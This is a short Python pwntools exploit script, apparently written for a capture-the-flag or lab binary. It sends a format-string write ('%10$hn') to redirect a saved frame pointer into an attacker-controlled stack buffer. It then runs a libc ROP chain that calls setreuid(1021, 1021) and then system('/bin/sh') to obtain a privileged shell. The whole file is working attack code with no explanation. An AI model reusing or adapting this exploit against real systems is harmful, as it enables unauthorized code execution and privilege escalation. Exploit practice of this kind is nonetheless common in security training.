import sys
from pwn import *

rpb_value = 0x00007fffffffe250
handle_in_rbp_addr = 0x7fffffffe120
buffer_stack_start = 0x7fffffffe130

# the goal is to overwrite the rbp (handle_in_rbp_addr) value (rpb_value) to the stack which I can control (buffer_stack_start) and then execute the rop chain to get a shell

context.arch = "amd64"
context.log_level = 'critical'

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000
rop = ROP(libc)

ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
ROP_RSI = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

SETREUID = libc.sym["setreuid"]
SYSTEM = libc.sym["system"]

BIN_SH = next(libc.search(b"/bin/sh"))

rop_chain = b""
rop_chain += p64(ROP_RDI)
rop_chain += p64(1021)
rop_chain += p64(ROP_RSI)
rop_chain += p64(1021)
rop_chain += p64(0xdeadbeef)
rop_chain += p64(SETREUID)
rop_chain += p64(ROP_RDI)
rop_chain += p64(BIN_SH)
rop_chain += p64(rop.ret[0])
rop_chain += p64(SYSTEM)

payload = b"%10$57648x"
payload += b"%10$hn\n"
payload += p64(handle_in_rbp_addr)
payload += rop_chain
payload += b"\n"

sys.stdout.buffer.write(payload)